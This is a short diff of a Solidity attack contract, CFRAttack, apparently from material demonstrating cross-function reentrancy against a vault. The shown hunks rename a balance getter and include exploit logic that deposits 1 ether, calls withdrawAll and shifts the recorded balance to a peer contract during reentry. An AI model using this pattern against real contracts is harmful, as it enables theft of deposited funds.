@@ -8,7 +8,7 @@ interface ICFRVault {
 
     function withdrawAll() external;
 
-    function userBalance(address _user) external view returns (uint256);
+    function balances(address _user) external view returns (uint256);
 }
 
 /// @title CFRAttack
@@ -44,7 +44,7 @@ contract CFRAttack {
         if (address(cfrVault).balance >= 1 ether) {
             cfrVault.transfer(
                 address(cfrAttackPeer),
-                cfrVault.userBalance(address(this))
+                cfrVault.balances(address(this))
             );
         }
     }
@@ -57,7 +57,7 @@ contract CFRAttack {
         if (msg.value != 1 ether) revert CFTAttack__UnmetMinimumETH();
 
         cfrVault.deposit{value: 1 ether}();
-        cfrVault.withdrawAll();        
+        cfrVault.withdrawAll();
     }
 
     function attackNext() external {
